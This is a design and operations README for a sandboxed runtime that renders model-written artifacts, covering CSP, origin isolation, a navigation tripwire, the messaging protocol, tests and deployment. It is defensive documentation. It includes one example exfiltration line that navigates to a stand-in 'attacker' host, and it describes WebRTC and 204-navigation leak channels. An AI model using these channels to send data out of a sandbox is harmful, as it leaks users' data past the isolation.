# Artifacts runtime (`besidka-artifacts`)

Artifacts are model-written HTML, React, SVG, Mermaid and Markdown. They are
untrusted code, so they never run on `besidka.com`. They run in a separate,
static Worker, `besidka-artifacts`, embedded by the app as
`<iframe sandbox="allow-scripts">`. This document covers the runtime Worker
(`workers/artifacts-runtime`), the postMessage protocol
(`packages/artifacts-protocol`) and how both are built, tested and deployed.
Ticket: BES-247 (A-2). Compliance input: `docs/legal/prechecks/artifacts.md`
(A-12, pre-check PR #736).

## What runs where

| Piece | Location | Notes |
| --- | --- | --- |
| Runtime document | `/v1/index.html` | The only document. Import map + one module script. |
| Runtime code and vendored libraries | `/v1/assets/*` | Hashed file names, `immutable`, CORS `*`. |
| Licence notices | `/v1/THIRD_PARTY_NOTICES.txt` | Generated at build time from the bundled packages. |
| Protocol | `packages/artifacts-protocol` | TypeScript source, no runtime dependencies, used by the app and the Worker. |

The Worker is assets-only: no `main`, no bindings, `html_handling` and
`not_found_handling` set to `none`, so `/v1/` and `/v1` return 404 instead of
serving the document without its headers. The version prefix lets a future
protocol v2 live next to v1.

## Isolation layers

1. **Opaque origin twice.** The app's iframe has `sandbox="allow-scripts"`
   (never `allow-same-origin`, `allow-popups`, `allow-forms` or
   `allow-top-navigation`), and the response carries the CSP `sandbox
   allow-scripts`, so the document has an opaque origin even when it is
   opened top-level (`self.origin === 'null'`). `document.cookie` and
   `localStorage` throw.
2. **CSP in the response headers** (generated by
   `workers/artifacts-runtime/scripts/headers.mjs`):

   ```text
   sandbox allow-scripts; default-src 'none';
   script-src 'self' 'unsafe-inline' blob:; style-src 'self' 'unsafe-inline';
   img-src 'self' data: blob:; font-src 'self' data:; media-src data: blob:;
   connect-src 'none'; form-action 'none'; frame-src 'none';
   base-uri 'none'; webrtc 'block';
   frame-ancestors https://besidka.com https://*.chernenko.workers.dev
   ```

   There is no third-party host in it. `'unsafe-eval'` is not needed: Sucrase
   emits text that is loaded as a module from a `blob:` URL, and Mermaid
   renders without `eval` (both verified in Chromium and WebKit). There is
   no `worker-src`, so `default-src 'none'` blocks workers. `webrtc 'block'`
   is not enforced by Chromium or WebKit today (tested); it stays for the
   engines that will enforce it.
3. **Only the MessagePort is trusted.** `event.origin` is `"null"` for every
   opaque frame, so it cannot identify anyone. The host hands the runtime a
   `MessageChannel` port on the iframe's first `load`; the runtime accepts the
   first `besidka/connect` whose `event.source === window.parent` and that
   carries exactly one port, then removes its `message` listener. Everything
   else on the window is ignored.
4. **No requests from the frame's own APIs.** `connect-src 'none'` and the
   image, font and media sources block fetch, XHR, beacons, images, fonts and
   media to other hosts, and storage and AI completions are host requests.
   CSP does not govern WebRTC: a TURN server URL reached the outside host in
   both engines, so the runtime removes `RTCPeerConnection` and its
   relatives from the window before any artifact code runs (`src/webrtc.ts`);
   a child frame cannot be used to get a fresh copy (`SecurityError` in both
   engines). DNS prefetch and preconnect hints were not tested. Navigation is
   the remaining channel (next item).
5. **Navigation.** The runtime's own CSP cannot stop the frame from
   navigating itself (`location.href = 'https://attacker/?d=…'`); the
   `navigate-to` directive that once covered this does not exist. Two layers:
   - **`frame-src` on the embedding page (required for A-4).** A page that
     embeds artifacts must send `Content-Security-Policy: frame-src
     <artifactsOrigin>`. The e2e spec shows that this blocks the
     self-navigation before its request leaves, in Chromium and WebKit; the
     blocked frame then loads an error page, which trips the wire below.
     It also covers targets that never fire `load` (a `204` response, a
     download, a `load` held open) and `data:` or `blob:` documents.
   - **Tripwire.** `createHostConnection` treats every `load` after the first
     as the frame having left the runtime: it closes the port, removes the
     iframe and calls `onUnexpectedNavigation`.
   **Without the `frame-src` policy the URL of the navigation, and whatever
   the new page sends while it loads, leave the browser before the tripwire
   fires; a navigation to a `204` target sends its URL and fires no `load`
   at all** (both recorded by the e2e spec). Never write that the frame
   "cannot send data out" or that credential collection is impossible; the
   residual risk belongs in the DPIA (A-9).

Top navigation (`window.top.location = …`) is blocked by the sandbox.

## Rendering

| Kind | Renderer | Notes |
| --- | --- | --- |
| `html` | `src/render/html.ts` | Parses the HTML with `DOMParser`, replaces the document's root element and runs the scripts in order, then dispatches synthetic `DOMContentLoaded` and `load`. |
| `react` | `src/render/react.ts` | Sucrase (`jsx` + `typescript`, automatic runtime) to an ES module loaded from a `blob:` URL; the default export is mounted with `react-dom/client`. |
| `svg` | `src/render/svg.ts` | Inserted into a `<main>`. |
| `mermaid` | `src/render/mermaid.ts` | Vendored Mermaid, `securityLevel: 'strict'`, `layout: 'dagre'`, theme from the host. Lazy chunk. |
| `markdown` | `src/render/markdown.ts` | `marked` with GFM. |

Why the HTML renderer does not use `document.open()/write()`: closing a
written document fires `load` on the host's iframe element, which is the
tripwire's signal. Replacing the root element keeps the Window, the port and
`window.besidka`, fires no host `load`, and keeps the runtime's listeners.
Consequences: an artifact that calls `document.write()` after load replaces
the document and trips the wire (A-3 tells models not to), and timers or
listeners from a previous version of an HTML artifact keep running after a
re-render, so the host should mount a fresh frame when it switches versions.
Classic scripts run in order (external ones are awaited), inline module
scripts are loaded from `blob:` URLs so their `load` event can be awaited
(up to 5 s each) before the synthetic events, and `meta[http-equiv]`
(a `refresh` would navigate the frame) and `noscript` (its content would
become live, since `DOMParser` parses with scripting off) are removed. The
SVG and Markdown renderers parse through a `<template>` and drop the same
elements. Links (`<a href>`, SVG `xlink:href`, `<area>`) are intercepted so a
click never navigates the frame.

Streaming (`tool-input-partial`) renders Markdown live and shows the other
kinds as a text preview of the latest lines; partial code never runs.

WebKit reports errors thrown by inline scripts of an opaque-origin document as
`Script error.` without details. The runtime forwards a clarified message;
the full error is in the browser console.

### Allowed imports

React artifacts may import only the vendored modules, resolved by the static
import map in `index.html`: `react`, `react/jsx-runtime`, `react-dom`,
`react-dom/client`, `recharts`, `lucide-react` (list in `src/vendor.ts`).
Before the module is loaded, `es-module-lexer` lists its imports; anything
else (unknown packages, URLs, relative paths, computed `import()`) stops the
render with an in-frame error, and nothing is requested. The esm.sh fallback
from the original ticket was dropped by the compliance pre-check (row 5:
unknown operator, no privacy policy); a missing library is added to the
vendored set instead. The final list should follow the A-10 golden prompts.

Every vendored module that imports React is bundled against the bare
specifiers (an esbuild plugin turns `require('react')` into a re-export of
the import-mapped module), so artifact code, Recharts and lucide-react share
one React instance.

## Licences

`scripts/build.mjs` collects every npm package that ended up in a bundle
(from the esbuild metafiles) and fails the build when a licence is outside
the allowlist in `scripts/licenses.mjs` (MIT, ISC, BSD-2/3-Clause,
Apache-2.0, 0BSD, CC0-1.0, Unlicense, Zlib; compound `AND` expressions of
those). Dual licences record the option taken: DOMPurify `(MPL-2.0 OR
Apache-2.0)` is used under Apache-2.0. `khroma@2.1.0` has no `license` field;
its shipped file is MIT, recorded in `LICENSE_OVERRIDES`.

Mermaid 12 defaults to the ELK layout, and `elkjs` is `EPL-2.0 OR
GPL-3.0-or-later`. The runtime does not ship it: the build resolves `elkjs`
to a stub that throws a clear error, and the Mermaid config selects the MIT
`dagre` layout. A diagram that asks for `layout: elk` fails with that error.

The generated `/v1/THIRD_PARTY_NOTICES.txt` holds each package's name,
version, licence and shipped licence text (marked's file includes the John
Gruber notice). A-9 links it from the `/a/` footer and the Privacy Policy.

## Protocol (`@besidka/artifacts-protocol`, version 1)

JSON-RPC 2.0 over the port, shaped like MCP Apps `ui/*` so Phase 4 can render
MCP `ui://` resources here. Methods (adding one needs a protocol bump):

| Direction | Method | Kind |
| --- | --- | --- |
| runtime → host | `ui/initialize` | request → `{ protocolVersion, hostContext }` |
| runtime → host | `ui/notifications/initialized` | notification |
| host → runtime | `ui/notifications/tool-input-partial` | notification (streaming) |
| host → runtime | `ui/notifications/tool-result` | notification (final render) |
| host → runtime | `ui/notifications/host-context-changed` | notification (`theme`, `displayMode`) |
| runtime → host | `ui/notifications/size-changed` | notification (`height`, per animation frame) |
| runtime → host | `ui/open-link` | request (host shows the URL, opens it only after a click) |
| runtime → host | `notifications/message` | notification (`error`/`warning`) |
| runtime → host | `besidka/storage/get|set|delete|list` | requests (A-5) |
| runtime → host | `besidka/complete` | request (A-6) |

Error codes beyond JSON-RPC's: `-32001` timeout, `-32002` connection closed,
`-32010` consent required, `-32011` declined by the viewer, `-32012` rate
limited, `-32013` not allowed. These are the consent hooks for A-5 and A-6:
the host checks consent (and may hold the request open while it asks the
viewer; `besidka/complete` waits up to 5 minutes, every other request 30 s)
and refuses with one of these codes, which `window.besidka` surfaces as a
`BesidkaBridgeError` with a plain message. A host without storage or
completion handlers answers `-32601`; the runtime then keeps storage in
memory and rejects `complete()` with "AI completions are not available here".

The host validates every param from the runtime before calling a handler
(sizes, URLs, storage keys and JSON values, prompt length) and never returns
internal error details. Guards bound what the runtime can send: frame
height at most 100,000 px, `maxOutputTokens` at most 2,000, prompts at
most 8,000 characters, storage keys without control characters or the
names `__proto__`, `constructor` and `prototype`, storage values at most
about 100 KB, 10,000 nodes and depth 32 (walked once per object, so shared
references cannot make validation exponential), links only `http(s)`
without user info or control and bidi characters, passed to `onOpenLink`
normalised. At most 16 runtime requests are in flight; more are refused
with `-32012`, and a second `ui/initialize` or another protocol version is
refused. Treat all port traffic as untrusted, every field artifact-authored
(artifact code shares the runtime's realm and can reach the port): it comes
from
the artifact's own frame.

Mount order for A-4: create the iframe with `src` already set, call
`createHostConnection(iframe, handlers, options)`, then insert the iframe, in
one task, and never move it in the DOM (Teleport, KeepAlive or a re-parent
reloads it and trips the wire); mount a fresh frame per version and display
mode. Notifications are coalesced until the runtime is ready (the latest
result wins over partials, context changes merge), and
`onConnectTimeout` fires when the runtime is not ready 15 s after the first
`load` (wrong origin, `frame-ancestors` mismatch, protocol skew). The host
must still clamp `size-changed` to its layout and render `notifications/message`
text as plain text only.


`window.besidka` (frozen): `storage.get/set/delete/list`,
`storage.persistent`, `complete(prompt, { maxOutputTokens })`, `theme`,
`onThemeChange(listener)` (returns an unsubscribe function).

## Local development

```bash
pnpm run artifacts:dev        # build with dev headers + wrangler dev on :8788
pnpm run artifacts:build      # production build (licence scan, bundle report)
pnpm run test:e2e:artifacts   # Playwright sandbox spec, Chromium + WebKit
```

The dev build adds `http://localhost:*` and `http://127.0.0.1:*` to
`frame-ancestors`. Set `NUXT_PUBLIC_ARTIFACTS_ORIGIN=http://localhost:8788`
in `.dev.vars` (see `.dev.vars.example`). Without it the app uses
`runtimeConfig.public.artifactsOrigin`, default
`https://besidka-artifacts.chernenko.workers.dev`. Keep that variable the only
place the runtime origin appears: production should move to a custom
user-content domain instead of `*.workers.dev` (pre-check row 11, owner item 1).

The sandbox spec (`tests/e2e-artifacts/runtime-sandbox.spec.ts`, config
`playwright.artifacts.config.ts`) runs the real runtime under `wrangler dev`
and a test-only host page (`tests/e2e-artifacts/server.mjs`, which also runs
an "outside origin" recorder). It is separate from the main e2e suite because
the main suite's server does not run the runtime. Covered: CSP and opaque
origin, blocked fetch/image/cookie/localStorage/top navigation, forged and
second connects ignored, all five kinds, streaming preview, unknown import
with no request, size and error notifications, theme switch without reload,
links through the host, the navigation tripwire, the host `frame-src`
policy blocking self-navigation before any request, WebRTC removed, the
`204` navigation residual, storage and completion fallbacks, and TSX
transpile time.

## CI and deployment

Both deploy paths are **guarded by the repository variable
`ARTIFACTS_RUNTIME_DEPLOY_ENABLED`**. Until it is `true`, nothing deploys the
runtime anywhere.

- **PRs (`preview-build.yml`, job `artifacts-runtime`)**: when a PR changes
  `workers/`, `packages/`, `tests/e2e-artifacts/`, the Playwright config,
  `pnpm-lock.yaml` or `pnpm-workspace.yaml`,
  the job builds the runtime with production headers (licence scan), uploads
  `preview-artifacts-runtime`, installs Chromium and WebKit and runs the
  sandbox spec. This needs no Cloudflare access.
- **Runtime previews (guarded)**: with the variable set, `preview-build.yml`
  builds the app with
  `NUXT_PUBLIC_ARTIFACTS_ORIGIN=https://pr-<n>-besidka-artifacts.chernenko.workers.dev`
  when the PR changes the runtime or the protocol, and `preview-deploy.yml`
  uploads `wrangler preview --name pr-<n>` of the runtime with the default
  branch's `wrangler.jsonc` (skipped on the bootstrap PR, which has none on
  `main`). The PR's `_headers` and any `_redirects` are replaced by headers
  generated from the default branch's `headers.mjs` before upload, and a
  failure there does not fail the app preview. `preview-cleanup.yml` deletes
  the runtime preview on close (not gated by the variable, a missing preview
  is fine). The preview host does
  not match the auth wildcard `*-besidka.chernenko.workers.dev`.
- **Production (`production.yml`, job `deploy-satellites`)**: on `main`, after
  the tests pass and only when `workers/artifacts-runtime/`,
  `packages/artifacts-protocol/`, `pnpm-lock.yaml` or `pnpm-workspace.yaml`
  changed in the push (or on `workflow_dispatch`), it builds and runs
  `wrangler deploy` for `besidka-artifacts` (concurrency group per Worker).
  `deploy` needs it and still runs when it is skipped. The change check
  compares only with the previous push, so a runtime change whose production
  run failed or was cancelled is not redeployed by the next push: re-run the
  failed run or start the workflow by hand.

### Owner steps before the first deploy

1. Decide the production host (pre-check owner item 1: a custom user-content
   domain, possibly in a separate Cloudflare account, rather than
   `besidka-artifacts.chernenko.workers.dev`). Update `PRODUCTION_FRAME_ANCESTORS`
   and `NUXT_PUBLIC_ARTIFACTS_ORIGIN` accordingly.
2. Make sure the `CLOUDFLARE_API_TOKEN` used by the `production` environment
   may create and deploy a new Worker and its previews.
3. Deploy once by hand (`pnpm --filter artifacts-runtime deploy`) or set the
   variable and push a runtime change; Workers Previews need the Worker to
   exist first. Then `curl -I` `/v1/index.html` and an asset to check the
   CSP, CORS and cache headers.
4. Set `ARTIFACTS_RUNTIME_DEPLOY_ENABLED=true` in the repository variables.
